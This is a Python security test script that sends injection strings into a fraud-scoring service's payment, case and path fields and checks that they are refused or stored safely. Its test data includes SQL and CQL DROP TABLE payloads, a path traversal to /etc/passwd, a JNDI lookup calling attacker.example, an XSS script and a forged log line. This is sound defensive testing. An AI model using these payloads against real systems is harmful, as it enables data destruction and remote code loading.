"""ST6: injection strings in every text field (threat 5). Design: docs/ingest.md, "Input"

    make k8s-st6        (cluster; needs your age key; opens a Cassandra tunnel)

Strings: SQL and CQL, JSON operators, path traversal, a forged log line, template and lookup
strings, HTML, a NUL character, 10 KB of text. Sent through Kong into:
  - a payment's ids (txn_id, user_id): must be refused, 422, as anything but id characters
  - a payment's free text (channel, e-mail domains, device): accepted, and Cassandra must hold
    exactly what was sent; text longer than the contract allows (256): refused, 422
  - the case system's write-back (note, external_ref) on a case of the test's own: stored exactly,
    visible exactly to an analyst, shown as text (not HTML) in the SIEM's page
  - path parameters of the case routes: 400 (Kong), 404 or 422, never a 5xx
Pass: no 5xx, no error text that leaks internals, the tables still there, other cases untouched,
and the free text stored as sent. Afterwards `make k8s-verify-audit` must find the chain intact.
"""

import argparse
import subprocess
import sys
import time
from pathlib import Path
from urllib.parse import quote

import httpx
import numpy as np

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "security" / "tests"))
from st11_personal_data import psql

from load.credentials import credentials
from load.replay import attr_columns, load_rows, to_request
from pseudonym import pseudonym
from store.history import HistoryStore, is_known, to_datetime

NS = "fraud"
SCORE = "/v1/transactions/score"
FORGED = "2026-11-10 12:00:00 ERROR FORGED-LOG-LINE admin promoted model"
STRINGS = {
    "sql": "' OR '1'='1",
    "sql drop": "x'; DROP TABLE cases; --",
    "cql drop": "x'); DROP TABLE fraud.txn_by_user; --",
    "json operator": '{"$gt": ""}',
    "path traversal": "../../../../etc/passwd",
    "log line": "x\n" + FORGED,
    "template": "{{7*7}} ${7*7} #{7*7}",
    "lookup": "${jndi:ldap://attacker.example/a}",
    "html": "<script>alert('st6')</script>",
    "nul": "x\x00y",
}
LONG = "A" * 5_000   # over the contract's 256 characters for a text attr: refused at the edge
# A path parameter with an injection string: Kong itself answers 400 for an encoded slash or NUL
# (nginx refuses the path); the services answer 404 (no such case) or 422 (not an id)
PATH_REFUSED = {400, 404, 422}
# Text in an answer that would mean an internal error leaked out
LEAKS = ["Traceback", 'File "', "psycopg", "syntax error", "InvalidRequest", "cassandra.",
         "SELECT ", "INSERT ", "Exception", "/usr/local/lib"]


def token(client, cid):
    r = client.post("/token", json=credentials(cid))
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def main():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--url", default="http://localhost:8080")
    args = p.parse_args()
    run = int(time.time())
    df = load_rows(ROOT / "data/processed/stream.parquet")
    frauds = df[(df["isFraud"] == 1) & df["uid"].map(is_known)]
    attrs = attr_columns()
    # a known card, so scoring saves the payment to Cassandra and the stored text can be read back
    base = to_request(df[df["uid"].map(is_known)].iloc[0].to_dict(), attrs)
    results, wrong = [], []

    def check(field, string, response, expect):
        status = response.status_code
        leaked = [w for w in LEAKS if w in response.text]
        ok = (status in expect) and status < 500 and not leaked
        results.append((field, string, status, ", ".join(leaked) or "none", "pass" if ok else "FAIL"))
        if not ok:
            wrong.append(f"{field} with {string}: {status}{', leaked ' + str(leaked) if leaked else ''}")

    other_cases_before = psql(f"SELECT count(*), count(resolved_at) FROM cases"
                              f" WHERE txn_id NOT LIKE 'st6-{run}-%';")[0]
    with httpx.Client(base_url=args.url, timeout=30) as client:
        merchant, tester = token(client, "merchant-1"), token(client, "load-test")
        analyst, casesys = token(client, "ana"), token(client, "case-mgmt")

        # 1. Ids: refused
        for name, s in STRINGS.items():
            for field in ("txn_id", "user_id"):
                check(f"payment {field}", name, client.post(SCORE, json={**base, field: s},
                                                            headers=merchant), {422})

        # 2. Free text in a payment: accepted, stored exactly
        stored = []
        for n, (name, s) in enumerate(STRINGS.items()):
            body = {**base, "txn_id": f"st6-{run}-text{n}", "channel": s,
                    "attrs": {**base["attrs"], "P_emaildomain": s, "R_emaildomain": s,
                              "DeviceType": s}}
            check("payment channel, e-mails, device", name,
                  client.post(SCORE, json=body, headers=merchant), {200})
            stored.append((name, s, body))
        long_body = {**base, "txn_id": f"st6-{run}-long",
                     "attrs": {**base["attrs"], "P_emaildomain": LONG}}
        check("payment e-mail over 256 characters", "5,000 characters",
              client.post(SCORE, json=long_body, headers=merchant), {422})

        # 3. The write-back, on a case of our own: find a fraud payment the model flags
        txn = None
        for n, i in enumerate(np.random.default_rng(run).permutation(len(frauds))[:60]):
            payment = {**to_request(frauds.iloc[i].to_dict(), attrs), "txn_id": f"st6-{run}-case{n}"}
            if client.post(SCORE, json=payment, headers=tester).json()["decision"] != "approve":
                txn = payment["txn_id"]
                break
        if txn is None:
            sys.exit("no flagged fraud payment in 60 tries")
        for _ in range(30):
            if psql(f"SELECT count(*) FROM cases WHERE txn_id = '{txn}';")[0] == "1":
                break
            time.sleep(1)
        # A NUL can't be stored in Postgres text: refused (422), not a 500
        check("write-back note", "nul", client.post(
            f"/v1/cases/txn/{txn}/decision", headers=casesys,
            json={"outcome": "fraud", "note": STRINGS["nul"]}), {422})
        note = "\n".join(v for k, v in STRINGS.items() if k != "nul")[:500]
        ref = (STRINGS["html"] + STRINGS["sql drop"])[:128]
        check("write-back note, external_ref", "all the others",
              client.post(f"/v1/cases/txn/{txn}/decision", headers=casesys,
                          json={"outcome": "fraud", "note": note, "external_ref": ref}), {200})
        case_id = psql(f"SELECT case_id FROM cases WHERE txn_id = '{txn}';")[0]
        seen = client.get(f"/cases/{case_id}", headers=analyst).json()

        # 4. Path parameters
        for name, s in STRINGS.items():
            check("GET /cases/{id}", name,
                  client.get(f"/cases/{quote(s, safe='')}", headers=analyst), PATH_REFUSED)
            check("GET /v1/cases/txn/{txn_id}", name,
                  client.get(f"/v1/cases/txn/{quote(s, safe='')}", headers=casesys), PATH_REFUSED)
            check("POST /cases/{id}/resolve note", name,
                  client.post("/cases/2000000000/resolve", headers=analyst,
                              json={"outcome": "fraud", "note": s}), {404, 422})

    # 5. What was stored
    stores = [("case note, as an analyst sees it", seen.get("note") == note)]
    audit = psql(f"SELECT details->>'external_ref' FROM audit_log WHERE action = 'case_resolved'"
                 f" AND details->>'txn_id' = '{txn}';")
    stores.append(("audit row external_ref, as stored", audit == [ref]))

    hist = HistoryStore(hosts=["localhost"])
    try:
        for name, s, body in stored:
            row = hist.session.execute(
                "SELECT p_emaildomain, device_type FROM txn_by_user WHERE user_id = %s AND ts = %s"
                " AND txn_id = %s",
                (pseudonym(body["user_id"]), to_datetime(body["ts"]), body["txn_id"])).one()
            stores.append((f"Cassandra row with {name}", row is not None
                           and row["p_emaildomain"] == s and row["device_type"] == s))
    finally:
        hist.close()

    tables = psql("SELECT string_agg(tablename, ',' ORDER BY tablename) FROM pg_tables"
                  " WHERE schemaname = 'public';")[0]
    stores.append((f"Postgres tables still there ({tables})",
                   {"audit_log", "cases", "siem_cursor"} <= set(tables.split(","))))
    other_cases_after = psql(f"SELECT count(*), count(resolved_at) FROM cases"
                             f" WHERE txn_id NOT LIKE 'st6-{run}-%';")[0]
    stores.append(("other cases untouched (count, resolved)",
                   other_cases_after == other_cases_before))
    page = ("import urllib.request; print(urllib.request.urlopen('http://localhost:8000/',"
            " timeout=10).read().decode())")
    siem = subprocess.run(["kubectl", "-n", NS, "exec", "deploy/siem-mock", "-c", "siem-mock",
                           "--", "python", "-c", page],
                          capture_output=True, text=True, check=False).stdout
    stores.append(("SIEM page shows the HTML as text",
                   "<script>alert" not in siem and "&lt;script&gt;" in siem))
    logs = subprocess.run(["kubectl", "-n", NS, "logs", "-l", "app in (ingest-svc,alert-svc)",
                           "--all-containers", "--since=10m", "--prefix"],
                          capture_output=True, text=True, check=False).stdout
    stores.append(("no forged log line in ingest's or alert-svc's logs",
                   not any(line.split("] ", 1)[-1].startswith(FORGED[:19])
                           for line in logs.splitlines())))

    print("| Field | String | Status | Leaked | Result |")
    print("|---|---|---:|---|---|")
    for field, name, status, leaked, result in results:
        print(f"| {field} | {name} | {status} | {leaked} | {result} |")
    print("\n| Check | Result |")
    print("|---|---|")
    for what, ok in stores:
        print(f"| {what} | {'pass' if ok else 'FAIL'} |")
        if not ok:
            wrong.append(what)
    print(f"\nTest case: {txn}. Next: make k8s-verify-audit (the audit chain must still be intact)")
    if wrong:
        sys.exit("ST6 FAILED:\n  " + "\n  ".join(wrong))
    print(f"ST6 PASSED: {len(results)} requests, no 5xx or leak; free text stored exactly as sent")


if __name__ == "__main__":
    main()
